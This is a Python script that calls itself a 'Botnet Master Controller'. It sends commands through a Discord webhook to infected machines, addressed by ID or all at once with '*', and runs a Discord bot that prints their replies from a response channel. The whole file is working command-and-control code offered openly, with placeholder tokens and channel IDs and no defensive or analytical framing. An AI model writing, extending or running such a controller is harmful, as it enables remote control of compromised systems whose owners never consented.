import discord
import argparse
import requests
from discord import SyncWebhook
from discord.ext import commands

# Configuration
TOKEN = "YOUR_DISCORD_BOT_TOKEN"
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"
COMMAND_CHANNEL_ID = 1234567890
RESPONSE_CHANNEL_ID = 1234567891

class MasterCLI:
    def __init__(self):
        self.webhook = SyncWebhook.from_url(WEBHOOK_URL)
        self.bot = commands.Bot(command_prefix="!", intents=discord.Intents.default())

    def send_command(self, target, command):
        self.webhook.send(f"{target} {command}")

    def monitor_responses(self):
        @self.bot.event
        async def on_ready():
            print(f"Master monitor connected as {self.bot.user}")

        @self.bot.event
        async def on_message(message):
            if message.channel.id == RESPONSE_CHANNEL_ID and message.author != self.bot.user:
                print(f"\n[Response from {message.content.splitlines()[0]}]\n{message.content}\n")

        self.bot.run(TOKEN)

def main():
    parser = argparse.ArgumentParser(description="Botnet Master Controller")
    subparsers = parser.add_subparsers(dest="command")

    # Command: send
    cmd_parser = subparsers.add_parser("send")
    cmd_parser.add_argument("--target", required=True, help="Target system ID or '*' for all")
    cmd_parser.add_argument("--command", required=True, help="Command to execute")

    # Command: monitor
    subparsers.add_parser("monitor")

    args = parser.parse_args()
    cli = MasterCLI()

    if args.command == "send":
        cli.send_command(args.target, args.command)
        print(f"Command sent to {args.target}")
    elif args.command == "monitor":
        print("Starting response monitor...")
        cli.monitor_responses()

if __name__ == "__main__":
    main()
